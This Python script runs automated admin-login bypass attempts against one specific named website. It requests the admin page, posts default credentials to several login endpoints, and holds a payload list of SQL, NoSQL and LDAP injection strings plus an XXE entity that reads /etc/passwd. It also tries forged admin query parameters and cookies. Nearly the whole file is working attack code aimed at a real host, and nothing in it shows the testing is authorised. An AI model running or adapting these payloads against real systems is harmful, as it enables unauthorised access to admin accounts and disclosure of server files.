#!/usr/bin/env python3
import requests

def test_admin_login_bypass():
    print("Testing Admin Login Bypass Techniques")
    print("=" * 50)
    
    target = "https://uplinkai.in/"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Test 1: Check if admin page is actually protected
    print("1. Testing /admin endpoint access...")
    try:
        response = session.get(target + "admin", timeout=10)
        print(f"   Status: {response.status_code}")
        print(f"   Content Length: {len(response.text)} bytes")
        
        # Look for authentication requirements
        auth_indicators = ['login required', 'authentication', 'session', 'cookie', 'token']
        found_auth = [indicator for indicator in auth_indicators if indicator in response.text.lower()]
        
        if found_auth:
            print(f"   🔒 Authentication detected: {found_auth}")
        else:
            print("   ✅ No authentication requirement found")
            
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    # Test 2: Try common admin bypass techniques
    print("\n2. Testing Common Admin Bypass Techniques...")
    
    bypass_payloads = [
        # Default credentials
        {'username': 'admin', 'password': 'admin'},
        {'username': 'admin', 'password': 'password'},
        {'username': 'admin', 'password': '123456'},
        {'username': 'root', 'password': 'root'},
        {'username': 'test', 'password': 'test'},
        
        # SQL Injection in login
        {'username': "admin'--", 'password': ''},
        {'username': "' OR '1'='1", 'password': "' OR '1'='1"},
        {'username': "admin'/*", 'password': ''},
        
        # NoSQL Injection
        {'username': '{"$ne": null}', 'password': '{"$ne": null}'},
        {'username': '{"$gt": ""}', 'password': '{"$gt": ""}'},
        
        # LDAP Injection
        {'username': '*)(uid=*', 'password': '*)(uid=*'},
        
        # XML External Entity (if XML-based)
        {'username': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', 'password': 'test'},
    ]
    
    # Test login endpoints
    login_endpoints = ['/admin/login', '/login', '/admin', '/dashboard']
    
    for endpoint in login_endpoints:
        print(f"\n   Testing login endpoint: {endpoint}")
        
        for i, credentials in enumerate(bypass_payloads[:5]):  # Test first 5 payloads
            try:
                print(f"     Testing payload {i+1}: {credentials}")
                
                # Try POST request
                response = session.post(
                    target + endpoint,
                    data=credentials,
                    timeout=10,
                    allow_redirects=True
                )
                
                # Check for successful login indicators
                success_indicators = [
                    'dashboard', 'welcome', 'admin', 'panel', 'logout',
                    'session', 'token', 'authenticated', 'success'
                ]
                
                found_success = []
                for indicator in success_indicators:
                    if indicator in response.text.lower():
                        found_success.append(indicator)
                
                if found_success:
                    print(f"       🚨 POTENTIAL SUCCESS: {found_success}")
                    print(f"       Status: {response.status_code}")
                    print(f"       URL: {response.url}")
                else:
                    print(f"       ✅ No success detected")
                    
            except Exception as e:
                print(f"       ❌ Error: {e}")
    
    # Test 3: Check for hidden admin parameters
    print("\n3. Testing Hidden Admin Parameters...")
    
    hidden_params = [
        '?admin=true',
        '?debug=admin',
        '?user=admin',
        '?role=admin',
        '?access=granted',
        '?bypass=true',
        '?test=admin'
    ]
    
    for param in hidden_params:
        try:
            print(f"   Testing parameter: {param}")
            response = session.get(target + "admin" + param, timeout=10)
            
            if 'admin' in response.text.lower() or response.status_code == 200:
                print(f"     🚨 Parameter might be effective")
            else:
                print(f"     ✅ No effect detected")
                
        except Exception as e:
            print(f"     ❌ Error: {e}")
    
    # Test 4: Check for cookie-based authentication bypass
    print("\n4. Testing Cookie-Based Authentication Bypass...")
    
    test_cookies = [
        {'admin': 'true', 'user': 'admin', 'role': 'admin'},
        {'session': 'admin_session', 'auth': 'granted'},
        {'user_id': '1', 'is_admin': '1'},
        {'access_level': 'admin', 'privilege': 'high'}
    ]
    
    for i, cookies in enumerate(test_cookies):
        try:
            print(f"   Testing cookie set {i+1}: {cookies}")
            
            response = session.get(
                target + "admin",
                cookies=cookies,
                timeout=10
            )
            
            if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                print(f"     🚨 Cookie bypass might be effective")
            else:
                print(f"     ✅ No cookie bypass detected")
                
        except Exception as e:
            print(f"     ❌ Error: {e}")

if __name__ == "__main__":
    test_admin_login_bypass()
